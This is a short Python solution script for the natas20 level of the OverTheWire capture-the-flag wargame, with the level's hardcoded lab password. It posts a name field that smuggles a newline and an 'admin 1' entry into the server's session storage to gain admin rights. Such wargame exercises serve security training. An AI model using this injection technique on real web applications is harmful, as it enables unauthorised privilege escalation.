#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

username = "natas20"
password = "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"

url = f"http://{username}.natas.labs.overthewire.org/?debug=true"

session = requests.Session()

# initial GET
resp = session.get(url, auth=(username, password), timeout=10)
print(resp.text)
print("=" * 80)

# POST payload (subscribe + admin toggle)
resp = session.post(url, data={"name": "plzsub\nadmin 1"}, auth=(username, password), timeout=10)
print(resp.text)
print("=" * 80)

# final GET to observe changes
resp = session.get(url, auth=(username, password), timeout=10)
print(resp.text)
print("=" * 80)
